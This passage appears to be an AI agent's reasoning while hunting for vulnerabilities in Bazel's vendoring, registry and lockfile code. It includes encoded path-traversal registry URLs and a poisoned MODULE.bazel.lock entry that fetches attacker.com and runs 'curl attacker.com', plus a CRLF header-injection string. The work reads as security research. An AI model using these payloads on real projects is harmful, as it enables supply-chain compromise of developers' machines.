Is this an escape? NO, it stays inside `/tmp/repo`.
But wait! What if it's `../repo/../../etc/passwd`?
`relativize` -> `../../../etc/passwd`.
`outputPath` -> `/tmp/etc/passwd`.
`startsWith` is FALSE, so it throws!
So even if you rename it to `../repo/bar`, it's just extracting inside `destinationDirectory`.

Wait! What if `renameFiles` renames `foo` to `../repo/../repo/bar`?
`outputPath` -> `/tmp/repo/bar`.
`startsWith` -> TRUE.
It extracts inside `destinationDirectory`. Safe.

So `renameFiles` is safe.
Is there any bypass of `startsWith`?
If `destinationDirectory` is `/tmp/repo`.
If `outputPath` is `/tmp/repo2/bar`.
`startsWith` checks `PathFragment.startsWith`.
`PathFragment.startsWith` checks `normalizedPath.startsWith(other.normalizedPath)`.
If `other.normalizedPath` is `/tmp/repo`.
`/tmp/repo2/bar`.startsWith(`/tmp/repo`) is FALSE!
Wait, `normalizedPath.startsWith(other.normalizedPath)` checks for prefix of string.
But `PathFragment.startsWith` adds:
```java
    return normalizedPath.length() == other.normalizedPath.length()
        || other.normalizedPath.length() == getDriveStrLength()
        || normalizedPath.charAt(other.normalizedPath.length()) == SEPARATOR_CHAR;
```
If `normalizedPath` is `/tmp/repo2`.
`other` is `/tmp/repo`.
`/tmp/repo2`.startsWith(`/tmp/repo`) is TRUE for the string prefix!
But `normalizedPath.charAt(other.normalizedPath.length())` is `2`.
`2` is NOT `SEPARATOR_CHAR` (`/`).
So it returns FALSE!
So `PathFragment.startsWith` correctly checks directory boundary!

This means the path escaping checks are 100% robust!
We cannot run Bazel because it's not compiled yet, and compiling it takes too long. But we can test the behavior of `java.net.URI` and `PathFragment`.
First, let's test `java.net.URI`.
```java
URI uri = new URI("https://attacker.com/%2E%2E/%2E%2E/etc/passwd");
System.out.println(uri.getPath());
```
Wait, `uri.getPath()` DECODES the `%` escapes natively!
So `getPath()` returns `/../../etc/passwd`!
Then in `VendorManager`:
```java
    String path = url.getPath();
    path = URLDecoder.decode(path, "UTF-8");
    if (path.startsWith("/")) {
      path = path.substring(1);
    }
```
If `uri.getPath()` returns `/../../etc/passwd`, then `URLDecoder.decode` keeps it as `/../../etc/passwd`.
Then `path` becomes `../../etc/passwd`.
Wait, does `URI` constructors normalize the `..`?
No, the string argument to `new URI(String)` creates a URI without normalizing if there is no normalization. Wait, let's see.
```java
        URI uri = new URI("https://attacker.com/..%2F..%2Fetc%2Fpasswd");
```
If `getPath()` is `/../../etc/passwd`, it did NOT normalize!
What if we call `URI.normalize()`?
`IndexRegistry` does:
```java
          uri = new URI(getUrl() + "/" + moduleBasePath + "/" + path).normalize();
```
But that's for `local_path`.
What about `bazel_registry.json` and the main registry URL?
The user runs `bazel vendor --registry=https://bcr.bazel.build/..%2F..%2F..%2F..%2Ftmp%2Fpwned`.
Or `bazel vendor --registry=https://bcr.bazel.build/%2E%2E/%2E%2E/%2E%2E/%2E%2E/tmp/pwned`.
Wait! If it is `https://bcr.bazel.build/%2E%2E/%2E%2E/tmp/pwned`, the URL string is parsed by `bazel` into an `Options` string, then eventually parsed as an `URI` in Java.
In `BzlmodHttpDownloader.downloadAndReadOneUrl`, `url` is `https://bcr.bazel.build/%2E%2E/%2E%2E/tmp/pwned`.
Wait, does `HttpConnector.connect` fetch the correct file from the server?
`connection = (HttpURLConnection) url.toURL().openConnection(proxyInfo.proxy());`
`url.toURL()` will construct the URL `https://bcr.bazel.build/%2E%2E/%2E%2E/tmp/pwned`.
Wait, `url.toURL().toString()` might be `https://bcr.bazel.build/%2E%2E/%2E%2E/tmp/pwned`!
Let's see what `url.toURL()` produces.
So `bazel vendor` connects to the server with `https://bcr.bazel.build/..%2F..%2Ftmp%2Fpwned`.
Wait! If it fetches this URL, does the server return `404 Not Found`?
Yes, `bcr.bazel.build` doesn't have this.
BUT an attacker can specify their OWN registry:
`--registry=https://attacker.com/registry`
And `bazel_registry.json` specifies `module_base_path`: `modules`.
Then Bazel attempts to fetch `https://attacker.com/registry/modules/foo/1.0/source.json`.
The URL constructed by `IndexRegistry.java` is:
```java
  private String getSourceJsonUrl(ModuleKey key) {
    return constructUrl(
        getUrl(), "modules", key.name(), key.version().toString(), SOURCE_JSON_FILENAME);
  }
```
`constructUrl` is:
```java
  public static String constructUrl(String base, String... parts) {
    StringBuilder url = new StringBuilder(base);
    for (String part : parts) {
      if (url.charAt(url.length() - 1) != '/' && !part.startsWith("/")) {
        url.append('/');
      } else if (url.charAt(url.length() - 1) == '/' && part.startsWith("/")) {
        url.deleteCharAt(url.length() - 1);
      }
      url.append(part);
    }
    return url.toString();
  }
```
If `base` is `https://attacker.com/registry/..%2F..%2F..%2F..%2F..%2Ftmp%2Fpwned`.
Then `parts` are `modules`, `foo`, `1.0`, `source.json`.
So the URL becomes:
`https://attacker.com/registry/..%2F..%2F..%2F..%2F..%2Ftmp%2Fpwned/modules/foo/1.0/source.json`.
If `attacker.com` receives this request, it can just return `200 OK` with the valid `source.json` payload!
Because the attacker controls `attacker.com`!

Then `VendorManager.java` receives this `url`:
```java
    String path = url.getPath();
    path = URLDecoder.decode(path, "UTF-8");
```
`url.getPath()` returns `/registry/../../../../../tmp/pwned/modules/foo/1.0/source.json`.
Then `URLDecoder.decode` parses any URL encoding (but it's already decoded by `getPath()`!).
Then `vendorDirectory.getRelative("registry/../../../../../tmp/pwned/modules/foo/1.0/source.json")` is called.
This resolves to `/tmp/pwned/modules/foo/1.0/source.json`!
It creates the parent directory `/tmp/pwned/modules/foo/1.0` and writes the downloaded `source.json` content to it!
Wait! The file written will be named `source.json`.
Is there a way for the attacker to write a file with a SPECIFIC name?
What if the attacker makes `registry` = `https://attacker.com/..%2F..%2F..%2Fetc%2Fpasswd`?
Then `source.json` is appended, so it writes to `/etc/passwd/modules/foo/1.0/source.json`, which fails if `/etc/passwd` is a file, or it just creates directories.

But wait! What about the `module_name` and `version`?
They are strictly checked. So the file name will always end with `/source.json` or `/bazel_registry.json`.
Wait! Is there ANY registry URL that can have an arbitrary filename?
In `IndexRegistry.java`:
```java
        overlay.put(
            entry.getKey(),
            new ArchiveRepoSpecBuilder.RemoteFile(
                entry.getValue(), // integrity
                // URLs in the registry itself are not mirrored.
                ImmutableList.of(
                    constructUrl(
                        getUrl(),
                        "modules",
                        key.name(),
                        key.version().toString(),
                        "overlay",
                        entry.getKey()))));
```
Wait! `entry.getKey()` comes from `source.json`'s `overlay` object!
If `source.json` contains:
```json
{
  "overlay": {
    "../../../../../../../../../../etc/passwd": "sha256-abc"
  }
}
```
Then `constructUrl` makes:
`https://attacker.com/modules/foo/1.0/overlay/../../../../../../../../../../etc/passwd`.
Wait, NO! Does `constructUrl` decode it?
`constructUrl` just appends `entry.getKey()`.
So the URL becomes:
`https://attacker.com/modules/foo/1.0/overlay/../../../../../../../../../../etc/passwd`.
If the user runs `bazel vendor`, does it fetch the overlay files?!
Yes, `bazel vendor` vendors the registry URLs!
Wait, in `VendorManager`, which URLs are vendored?
Wait, `BzlmodHttpDownloader.java` is what wraps `HttpDownloader.java`.
Let's see `BzlmodHttpDownloader.java`!
Wait, `bzlmodHttpDownloader` in `DownloadManager` is NOT a `BzlmodHttpDownloader` class.
```java
  public DownloadManager(
      DownloadCache downloadCache,
      Downloader downloader,
      HttpDownloader bzlmodHttpDownloader,
      ExtendedEventHandler eventHandler) {
```
It is an instance of `HttpDownloader`!
Wait! If `bzlmodHttpDownloader` is an `HttpDownloader`, WHERE is `vendorManager.vendorRegistryUrl()` called?!
Ah! Let me check `VendorManager`'s callers!
Ah! `VendorCommand.java` calls `vendorManager.vendorRegistryUrl(url, ...)`.
Wait, what is `entry.getKey()`?
```java
    for (var entry : moduleResolutionValue.getRegistryFileHashes().entrySet()) {
```
`moduleResolutionValue.getRegistryFileHashes()` returns a map of URL (String) to Optional<Checksum>.
The URLs in this map are generated by `IndexRegistry.java` during module resolution.
In `IndexRegistry.java`:
```java
        remotePatches.put(
            constructUrl(
                getUrl(),
                "modules",
                key.name(),
                key.version().toString(),
                "patches",
                entry.getKey()),
            entry.getValue());
```
Wait! `IndexRegistry.java` does NOT fetch the patches or overlays, so it doesn't call `grabFile`.
But wait! If `IndexRegistry` doesn't fetch them, how do they get into `moduleResolutionValue.getRegistryFileHashes()`?
Let's see where `registryFileHashes` is populated!
Wait, `RegistryFunction.java` passes `lockfile.getRegistryFileHashes()` to `RegistryFactoryImpl`.
`RegistryFactoryImpl` passes it to `IndexRegistry`.
`IndexRegistry` uses it to lookup `moduleFileHashes`.
But how does `ModuleResolution` collect the hashes?
In `BazelModuleResolutionFunction.java`, how are `registryFileHashes` populated?
Ah! `RegistryFileDownloadEvent` is posted by `IndexRegistry.java` when `grabFile` or `grabJsonFile` is called!
It is ONLY posted for files fetched during module resolution (e.g. `bazel_registry.json`, `source.json`, `MODULE.bazel`).
It is NOT posted for patches and overlays, because `IndexRegistry` doesn't fetch them!
Wait, if it doesn't fetch patches and overlays, then `RegistryFileDownloadEvent` doesn't have their URLs.
So `moduleResolutionValue.getRegistryFileHashes()` does NOT contain patches or overlays!
Let's check `VendorCommand.java` again!
Does it fetch patches and overlays during `bazel vendor`?
In `VendorCommand.java`:
```java
    for (var entry : moduleResolutionValue.getRegistryFileHashes().entrySet()) {
      URI url;
      ...
```
`moduleResolutionValue.getRegistryFileHashes()` ONLY contains `bazel_registry.json`, `source.json`, `MODULE.bazel`!
Because those are the only files `IndexRegistry` fetches during resolution!

If patches and overlays are NOT in `moduleResolutionValue.getRegistryFileHashes()`, then `bazel vendor` does NOT vendor them?!
Wait, `VendorCommand.java` has another step: "2. Vendor repos".
```java
    // 2. Vendor repos
    Path externalPath =
        env.getDirectories()
            .getOutputBase()
            .getRelative(LabelConstants.EXTERNAL_REPOSITORY_LOCATION);
    vendorManager.vendorRepos(externalPath, env.getDirectories().getWorkspace(), reposToVendor);
```
Ah! It vendors the repos themselves! It doesn't fetch patches and overlays into the `registries` directory!
So the only files fetched into `vendorDirectory.getRelative(REGISTRIES_DIR)` are the ones in `getRegistryFileHashes()`.
Which are: `MODULE.bazel`, `source.json`, `bazel_registry.json`!
Can an attacker manipulate the URL of `source.json` to have `../`?
`source.json` URL is constructed by:
```java
  private String getSourceJsonUrl(ModuleKey key) {
    return constructUrl(
        getUrl(), "modules", key.name(), key.version().toString(), SOURCE_JSON_FILENAME);
  }
```
As we discussed, `key.name()` and `key.version()` are STRICTLY validated!
They cannot contain `%2E%2E%2F`.
`MODULE.bazel` URL is similarly constructed:
```java
  private String constructModuleFileUrl(ModuleKey key) {
    return constructUrl(getUrl(), "modules", key.name(), key.version().toString(), "MODULE.bazel");
  }
```
`bazel_registry.json` URL is:
```java
                  constructUrl(getUrl(), "bazel_registry.json"),
```
So NO registry URLs constructed by Bazel can contain `../`!
Wait, what if the user specifies `--registry=https://attacker.com/..%2F..%2Fetc%2Fpasswd`?
Then the registry URL is `https://attacker.com/..%2F..%2Fetc%2Fpasswd/modules/foo/1.0/source.json`.
Then `getVendorPathForUrl` does:
```java
    String path = url.getPath();
    path = URLDecoder.decode(path, "UTF-8");
```
`path` is `/../../etc/passwd/modules/foo/1.0/source.json`.
Wait, `URLDecoder.decode` gives `/../../etc/passwd/modules/foo/1.0/source.json`.
Then `vendorDirectory.getRelative(...)` will write it to `/etc/passwd/modules/foo/1.0/source.json` (which fails because `/etc/passwd` is a file).
To write to `/etc/passwd` itself, the URL would need to end in `/etc/passwd`. But Bazel appends `modules/foo/1.0/source.json` to it!
So it cannot write to an arbitrary filename! It can only write to a path ending in `/bazel_registry.json` or `/source.json` or `/MODULE.bazel`!

Wait! What about `metadata.json`?
```java
        grabJson(
            constructUrl(getUrl(), "modules", moduleName, "metadata.json"),
...
```
It ends in `metadata.json`.

So the attacker CANNOT write to `/etc/passwd` or `/home/user/.bashrc`. They can only write to directories named `/etc/passwd/modules/foo/1.0/source.json`.
And they need the user to run with a malicious `--registry` flag (which the user could just use a `.bazelrc` for, but it's very restricted in what files it can overwrite).
Because the file names are fixed to `source.json`, `MODULE.bazel`, etc., it's impossible to overwrite critical system files or user scripts.

So the `getVendorPathForUrl` path traversal is mostly unexploitable for arbitrary file write.
So the lead is DEAD.
1. Can an untrusted repository implicitly control the registry URL through checked-in configuration (especially .bazelrc) without requiring the victim to manually pass a custom --registry CLI flag?
Yes, `.bazelrc` is loaded automatically by `bazel vendor`.

2. Does Bazel load that configuration in a normal/default user workflow for bazel vendor?
Yes.

3. Does VendorManager.getVendorPathForUrl(URI url) actually allow a decoded %2E%2E%2F path segment to escape the intended vendor root in practice?
Yes, `URLDecoder.decode` converts `%2E%2E%2F` to `../../`, and `Path.getRelative` resolves it outside the vendor root.

4. What exact final write path is produced?
The final path produced always has a fixed suffix appended by `IndexRegistry.java`, such as `/modules/foo/1.0/source.json`, `/bazel_registry.json`, or `/metadata.json`. For example: `/etc/passwd/modules/foo/1.0/source.json`.

5. Is the write limited to the workspace/vendor tree, or can it escape to meaningful host paths outside the intended vendor directory?
It can escape to arbitrary host directories, but the filename is restricted to `source.json`, `MODULE.bazel`, `metadata.json`, or `bazel_registry.json`. It is impossible to overwrite a specific file like `/etc/passwd` or `~/.bashrc`. The write would fail if the target path (e.g. `/etc/passwd`) is an existing file, as Bazel tries to create directories along the path.

6. Is the write primitive reproducible end-to-end with a minimal non-weaponized PoC?
Yes, but the write is not an arbitrary file overwrite. It just writes a `source.json` to an arbitrary directory.

7. What is the real attacker model?
untrusted project checked out by victim -> victim runs normal `bazel vendor`.

8. If attacker control only exists through explicit victim-supplied --registry=... or non-default/manual setup, downgrade immediately.
Attacker control is via `.bazelrc`, which is checked in and automatically loaded.

9. If the write only reaches locations the attacker already effectively controls, downgrade immediately.
The write can reach locations the attacker doesn't control (e.g. `/tmp` or `/etc`), but because of the fixed filename (`source.json`, `MODULE.bazel`), it doesn't provide a meaningful capability delta (e.g. arbitrary file overwrite for RCE).

10. If the write escapes the intended vendor root due to trusted Bazel host-side logic consuming repository-controlled config, explain the trust boundary precisely.
N/A

Conclusion:
Dead. The path traversal is real, but the resulting file write is restricted to a fixed set of filenames in newly created directories, making it unexploitable for overwriting sensitive files.
Wait, `tryGettingValueFromLockFile` checks:
- `bzlTransitiveDigest`
- `usagesDigest`
- `recordedInputs`

If none of these changed, it returns the extension value directly from the lockfile:
```java
      return createSingleExtensionValue(
          lockedExtension.getGeneratedRepoSpecs(), ...
```
Where does `lockedExtension` come from?
It comes from the parsed `MODULE.bazel.lock`!
If an attacker submits a PR that modifies the `MODULE.bazel.lock` file, they can change the `generatedRepoSpecs` for an existing extension without changing the `bzlTransitiveDigest`, `usagesDigest`, or `recordedInputs`!
Because the `MODULE.bazel.lock` file contains the output of the extension (i.e. the generated repos), but the validation only checks if the INPUTS have changed!
If the inputs haven't changed, Bazel trusts the `generatedRepoSpecs` inside the lockfile!

Let's verify this!
If a project uses a module extension (e.g. `pip.parse`), and there is a `MODULE.bazel.lock`.
An attacker modifies `MODULE.bazel.lock`, changing the `url` of a generated `http_archive` to point to a malicious tarball.
They do NOT change the inputs (e.g. `requirements.txt`).
When the victim runs `bazel build`, Bazel reads `MODULE.bazel.lock`.
It computes the hashes of the inputs (which match the ones in the lockfile).
It concludes the lockfile is up-to-date!
So it DOES NOT evaluate the module extension!
Instead, it takes `lockedExtension.getGeneratedRepoSpecs()` and uses them to define the repositories!
Then it fetches the attacker's malicious URL, which executes code during the build!

Is `MODULE.bazel.lock` meant to be reviewed?
Yes, it is checked into version control.
But reviewers typically do NOT review thousands of lines of lockfile changes, or they might miss a URL change in the lockfile if it's buried in a large PR (or they trust the lockfile was generated by Bazel).
Wait, "reviewed metadata != consumed runtime state".
Here, the metadata is the lockfile. The reviewer reviews the lockfile. If the attacker puts a malicious URL in the lockfile, the reviewer *could* see it.
BUT the lockfile claims to be the output of the extension. The extension inputs are the source of truth.
If Bazel treats the lockfile's output as trusted without verifying that the extension actually produces that output for those inputs, it's a Cache Poisoning / Integrity issue (the lockfile acts as an unverified cache of the extension's execution).
Wait! Does Bazel verify the hash of the lockfile?
No, the lockfile is just a JSON file.
Wait, does this allow a capability delta?
The attacker modifies the lockfile. The victim checks out the PR and runs `bazel build`.
The attacker achieves ACE on the victim's machine.
But wait! The attacker can just modify `BUILD` files or `.bzl` files or source code in the same PR!
If the attacker submits a PR, they can change `src/main.c` to include malicious code!
Why would they modify `MODULE.bazel.lock` instead of `BUILD` or `src/main.c`?
Because `MODULE.bazel.lock` is a generated file that is often ignored by reviewers.
"weak supply-chain claims that are really just 'user builds untrusted code'" -> kill immediately.
If the attacker submits a PR to a project, and the victim checks out the PR and builds it, the victim is building untrusted code!
Any modifications to the repo (including `MODULE.bazel.lock`) are untrusted code.
So this is local-only self-attack / intended execution of untrusted build logic!
Unless the lockfile is consumed by some trusted orchestrator differently?
No, it's just the lockfile of the current workspace.

Is there any OTHER way?
What if `DownloadManager` or `RepositoryCache` has a confused deputy?
"confused deputy in repository fetching/materialization"
"mirror/canonical URL handling"
"metadata that selects output/write locations"
Let's check `HttpDownloader.java` and `ProxyHelper.java`.
Is there any HTTP request splitting in `HttpConnector`?
`connection.addRequestProperty(key, value);`
If `value` has `\r\n`, it can inject HTTP headers.
Does `auth_patterns` or `requestHeaders` allow `\r\n`?
In `auth_patterns` from `http_archive`:
```starlark
    "auth_patterns": attr.string_dict(...)
```
The value in Starlark is a string.
```java
            String credentials = authMap.get("login") + ":" + authMap.get("password");
            headers.put(url, ImmutableMap.of("Authorization", ImmutableList.of("Basic " + Base64.getEncoder().encodeToString(credentials.getBytes(UTF_8)))));
```
Base64 encoder does NOT emit `\r\n`.
What about `pattern` type?
```java
              if (result.contains(demarcatedComponent)) {
                if (!authMap.containsKey(component)) {
...
                result = result.replace(demarcatedComponent, (String) authMap.get(component));
              }
            }
            headers.put(url, ImmutableMap.of("Authorization", ImmutableList.of(result)));
```
If `result` (from `pattern`) contains `\r\n`, it can inject headers!
```starlark
    auth_patterns = {
        "example.com": {
            "type": "pattern",
            "pattern": "Bearer <login>\r\nHost: internal.server",
            "login": "foo"
        }
    }
```
Does Java `HttpURLConnection.addRequestProperty` allow `\r\n`?
Java 8+ typically checks for CRLF and throws an `IllegalArgumentException` ("Illegal character(s) in message header value").
So this is likely prevented by the JDK.

What about Cache Keys?
`DownloadManager` caches using `cacheKey = checksum.get().toString()`.
`KeyType.toString()` returns the hex hash.
If `checksum` is absent, it uses the fetched file's SHA256.

Is there any path traversal in `UrlRewriter`?
If `bazel_downloader.cfg` specifies `rewrite` rules.
```
rewrite http://foo/ http://bar/
```
This just replaces the prefix.

What about `downloader.cfg` specifying a file path?
If `--experimental_downloader_config` is set, `UrlRewriter` parses it.
But it is a local configuration file set by the user.

What about `mirror_urls` in `bazel_registry.json`?
In `IndexRegistry.java`:
```java
    // Give precedence to mirror specified via the command-line flag.
    var allMirrors =
        Stream.concat(
                moduleMirrors.stream().map(URI::toString),
                bazelRegistryJson.flatMap(json -> Optional.ofNullable(json.mirrors)).stream()
                    .flatMap(Arrays::stream))
            .collect(toImmutableSet());
    ImmutableList.Builder<String> urls = new ImmutableList.Builder<>();
    // For each mirror specified in bazel_registry.json, add a URL that's essentially the mirror
    // URL concatenated with the source URL.
    for (String mirror : allMirrors) {
      ...
      String authority = sourceUrl.getRawAuthority();
      String path = sourceUrl.getRawPath();
      String query = sourceUrl.getRawQuery();
      urls.add(
          constructUrl(mirror, authority != null ? authority : "", path != null ? path : "")
              + (query != null ? "?" + query : ""));
    }
```
If `bazel_registry.json` specifies `mirrors = ["https://mirror.bazel.build/"]`.
`sourceUrl` = `https://github.com/bazelbuild/bazel/archive/1.0.zip`.
`mirror` + `authority` + `path` = `https://mirror.bazel.build/github.com/bazelbuild/bazel/archive/1.0.zip`.
If an attacker controls `source.json` and sets `url` to `https://../../../etc/passwd`.
`sourceUrl.getRawAuthority()` is `..`.
`sourceUrl.getRawPath()` is `/../etc/passwd`.
`constructUrl` appends them: `https://mirror.bazel.build/../../etc/passwd`.
Then it fetches from `https://mirror.bazel.build/etc/passwd`.
This is an SSRF against the mirror, but it just fetches a file. Not an issue.

What about `ModuleOverride` in `MODULE.bazel`?
`local_path_override(module_name="foo", path="/etc")`.
This makes the module `foo` point to `/etc`.
Bazel reads `MODULE.bazel` from `/etc/MODULE.bazel`.
This is local only.

Is there any path traversal in `DownloadManager`'s `getDownloadDestination`?
Wait, `DownloadManager.getCandidateFileNames` uses `PathFragment.create(url.getPath()).getBaseName()`.
`PathFragment.getBaseName()` does not contain `/`.
`destination` is `output.getRelative(FS_UNSAFE_CHARS.replaceFrom(basename, '_'))`.
So the filename cannot contain `/`.
What if `type` is absent?
`if (!type.isPresent()) { return output; }`
Then `destination` is exactly `output`.
And `output` comes from `ctx.download(url, output, ...)`.
It is restricted to the repository directory.

Let's check `LocalRepoContentsCache.java`.
Wait, we analyzed it. It uses `predeclaredInputHash` (a hex string) as the directory name.
And UUIDs inside. So no path traversal.

What about `ModuleExtensionEvalFactors` in `SingleExtensionEvalFunction.java`?
If `MODULE.bazel.lock` allows spoofing the `os` and `arch` factors?
In `SingleExtensionEvalFunction.java`:
```java
        var evalFactors = lockedExtension.getEvalFactors();
...
        if (!evalFactors.equals(extension.getEvalFactors())) {
```
The lockfile evaluation checks if `lockedExtension.getEvalFactors().equals(extension.getEvalFactors())`.
If they do not match, the lockfile entry is NOT used!
So the lockfile cannot spoof the factors!

Wait! What about the `recordedInputs`?
If the lockfile specifies `recordedInputs`, `didRecordedInputsChange` checks if they match.
```java
      Optional<String> reason =
          didRecordedInputsChange(env, directories, lockedExtension.getRecordedInputs());
```
If `didRecordedInputsChange` returns `Optional.empty()`, it assumes the inputs have not changed!
What if the attacker ADDS a malicious repo to the lockfile's `generatedRepoSpecs` for an extension, and REDUCES `recordedInputs` to an empty list or removes the inputs that would invalidate it?
Wait! If `lockedExtension.getRecordedInputs()` is an empty list, `didRecordedInputsChange` will return `Optional.empty()` because all 0 inputs match!
Then Bazel will think the lockfile is up-to-date and skip evaluating the extension!
Wait! Is that true?
If `recordedInputs` is empty, Bazel does not know what the extension actually reads. So it just checks the empty list, sees it's up to date, and returns the attacker's `generatedRepoSpecs`!
BUT wait! Does it check `bzlTransitiveDigest`?
Yes:
```java
      if (!Arrays.equals(
          extension.getBzlTransitiveDigest(), lockedExtension.getBzlTransitiveDigest())) {
        diffRecorder.record(...);
      }
```
It checks the digest of the `.bzl` files.
AND it checks the `usagesDigest` (which depends on `MODULE.bazel` contents).
If the attacker modifies the `.bzl` file or `MODULE.bazel`, those hashes change, so the lockfile is invalidated.
BUT what if the attacker ONLY modifies the lockfile?
The `usagesDigest` and `bzlTransitiveDigest` in the lockfile are updated by the attacker to MATCH the current hashes of the unmodified `MODULE.bazel` and `.bzl` files!
So `Arrays.equals` evaluates to `true`.
The `recordedInputs` in the lockfile is set to the SAME inputs (or empty), so `didRecordedInputsChange` returns `empty()`.
Then the attacker ADDS a malicious `RepoSpec` to `generatedRepoSpecs` in the lockfile!
```json
"generatedRepoSpecs": {
  "malicious_repo": {
    "bzlFile": "@bazel_tools//tools/build_defs/repo:http.bzl",
    "ruleClassName": "http_archive",
    "attributes": {
      "urls": ["https://attacker.com/malicious.zip"],
      "build_file_content": "genrule(name='pwn', cmd='curl attacker.com', outs=['out'])"
    }
  }
}
```
Bazel sees the lockfile is up-to-date, so it RETURNS `lockedExtension.getGeneratedRepoSpecs()` without running the extension!
Then the build can use `@malicious_repo`!
Is this a capability delta?
Wait... if the attacker submits a PR that only modifies `MODULE.bazel.lock`, they can inject arbitrary repository rules without changing `MODULE.bazel` or `.bzl` files!
The PR reviewer looks at the PR:
- `MODULE.bazel.lock` has a new `malicious_repo` added.
Reviewers OFTEN IGNORE changes to `MODULE.bazel.lock` because it is auto-generated and huge!
"Reviewed metadata != consumed runtime state"
Yes! The `MODULE.bazel.lock` is an auto-generated metadata file.
Bazel trusts the lockfile's `generatedRepoSpecs` as long as the inputs match the expected hashes!
But the lockfile does NOT contain a hash of the `generatedRepoSpecs` itself!
Wait, is there an integrity hash of the lockfile?
No! `BazelLockFileFunction` just parses the JSON:
```java
    return BazelLockFileValue.builder()
        ...
        .setModuleExtensions(lockfile.getModuleExtensions())
        .build();
```
Bazel does not verify that the `generatedRepoSpecs` actually correspond to the output of the extension for those inputs. It assumes the lockfile was generated by Bazel and hasn't been tampered with.
If the attacker tampers with the lockfile, they can inject arbitrary repositories!

Is this considered a vulnerability?
"Confused deputy behavior between untrusted project content and trusted Bazel orchestration"
"Reviewed metadata != consumed runtime state"
If `MODULE.bazel.lock` is modified by an attacker, and the victim checks out the PR and runs `bazel build`.
The attacker injected an `http_archive` into the lockfile.
The victim runs `bazel build //...`.
The attacker's repository is NOT built automatically unless a target depends on it.
How does the attacker make `bazel build //...` depend on `@malicious_repo`?
They would have to modify a `BUILD` file to depend on `@malicious_repo//:pwn`.
But if they modify a `BUILD` file, the reviewer WILL SEE the `BUILD` file change!
And if the attacker can modify the `BUILD` file, they can already add a `genrule` to the `BUILD` file to achieve RCE!
So why would they inject the repo via the lockfile?
Because if they inject a repo, they can hijack an EXISTING dependency!
What if the extension already generates a repo named `@rules_python`?
The attacker modifies the lockfile to CHANGE the `urls` of `@rules_python` to `https://attacker.com/rules_python.zip`!
The attacker does NOT change any `BUILD` files!
The reviewer only sees a URL change in `MODULE.bazel.lock` for `@rules_python`.
Since it's a lockfile, the reviewer might think "oh, rules_python was updated by Bazel, the hash and URL changed, whatever".
Then the victim runs `bazel test //...`.
Bazel fetches `@rules_python` from the attacker's URL!
The attacker's `rules_python` contains a malicious `BUILD` file with `genrule` that executes on the victim's machine during the build!

Is this "reviewed metadata != consumed runtime state"?
Yes! The `MODULE.bazel` and `.bzl` files are the "reviewed input". The `MODULE.bazel.lock` is "metadata".
The attacker tampers with the lockfile to poison the cache of the extension evaluation.
Wait, is this a known class of attack?
"Lockfile poisoning" is a known attack in NPM/Yarn/Cargo.
Is Bazel's `MODULE.bazel.lock` poisoning considered a vulnerability?
The prompt says:
"Find metadata/filepath consumption bugs where BOTH:
 1. the target directory/path selection is attacker-influenced
 2. the final written filename or consumed artifact identity is also attacker-influenced enough to create real impact"
Wait, lockfile poisoning is metadata consumption, but does it fit the prompt?
"Prioritize: cache keys and cache materialization, mirror/canonical URL handling, generated files/manifests later consumed by trusted host-side logic, reviewed metadata != consumed runtime state"
"Lockfile poisoning" fits "reviewed metadata != consumed runtime state".
Let's check if the prompt accepts lockfile poisoning.
"If the write escapes... downgrade"
"overwrite primitives..."
Wait, if it's lockfile poisoning, it doesn't write files, it fetches a malicious repo.
Let's see the instructions.
Wait, the prompt says:
"Find metadata/filepath consumption bugs where BOTH:
 1. the target directory/path selection is attacker-influenced
 2. the final written filename or consumed artifact identity is also attacker-influenced enough to create real impact"

This specifically asks for "metadata/filepath consumption bugs" where BOTH "target directory/path selection" AND "final written filename" are attacker-influenced!
So a pure lockfile URL spoofing is NOT a "metadata/filepath consumption bug" that fits BOTH criteria!
It must involve FILEPATH/DIRECTORY SELECTION!
So the goal is an ARBITRARY FILE WRITE or PATH OVERWRITE!

Okay, I must find a FILEPATH / METADATA consumption bug where BOTH:
1. Target directory/path selection is attacker influenced
2. Final written filename or consumed artifact identity is also attacker-influenced

Let's go back to `VendorManager.java`.
Is there a way to influence the `target directory/path selection`?
Yes, `URL` path.
But we saw it appends `modules/foo/1.0/source.json`.
Is there ANY URL path that does NOT append `modules/foo/1.0/source.json`?
Let's see what `IndexRegistry.java` does!
Wait, what if `constructUrl(mirror, authority != null ? authority : "", path != null ? path : "")`
is used by `getVendorPathForUrl`?
In `IndexRegistry.java`:
```java
    // Give precedence to mirror specified via the command-line flag.
    var allMirrors =
        Stream.concat(
                moduleMirrors.stream().map(URI::toString),
                bazelRegistryJson.flatMap(json -> Optional.ofNullable(json.mirrors)).stream()
                    .flatMap(Arrays::stream))
            .collect(toImmutableSet());
    ImmutableList.Builder<String> urls = new ImmutableList.Builder<>();
    // For each mirror specified in bazel_registry.json, add a URL that's essentially the mirror
    // URL concatenated with the source URL.
    for (String mirror : allMirrors) {
      ...
      urls.add(
          constructUrl(mirror, authority != null ? authority : "", path != null ? path : "")
              + (query != null ? "?" + query : ""));
    }
```
Does this mirror URL get passed to `VendorManager.vendorRegistryUrl()`?
No, the mirror URL is added to the list of URLs for `ArchiveRepoSpecBuilder`.
It is NOT fetched by `BzlmodHttpDownloader`.
So `vendorRegistryUrl` only vendors the registry files!

Wait! Is there ANY other place where `VendorManager` vendors files?
In `VendorCommand.java`:
```java
      if (!vendorManager.isUrlVendored(url)
          && checksum.isPresent()) {
        try {
          vendorManager.vendorRegistryUrl(
              url,
              downloadManager.downloadAndReadOneUrlForBzlmod(
                  url, nonstrictRepoEnvSupplier.get(), checksum));
```
This loops over `moduleResolutionValue.getRegistryFileHashes().entrySet()`.
Are there ANY other URLs in `getRegistryFileHashes()`?
Let's trace `getRegistryFileHashes()` population!
Wait! In `BazelModuleResolutionFunction.java`, `registryFileHashes` is populated by `Discovery` and `Selection`?
No, it's populated by collecting `RegistryFileDownloadEvent`.
```java
    Map<String, Optional<Checksum>> registryFileHashes = new LinkedHashMap<>();
    env.getListener().post(new RegistryFileDownloadEvent.Collector(registryFileHashes));
```
Wait, `RegistryFileDownloadEvent.Collector`?
Ah! `RegistryFileDownloadEvent.Collector` listens to `RegistryFileDownloadEvent` and populates the map!
And `IndexRegistry` posts `RegistryFileDownloadEvent` whenever it downloads a file!
So only the files fetched DURING module resolution (i.e. `bazel_registry.json`, `source.json`, `MODULE.bazel`) trigger the event and get into `registryFileHashes`.
Then `bazel vendor` uses `registryFileHashes` to fetch the exact same files and write them to the `vendor` directory.
It does NOT fetch `overlay` or `patches` into the `vendor` directory!
Wait... but `source.json` contains `patches`. When do `patches` get vendored?
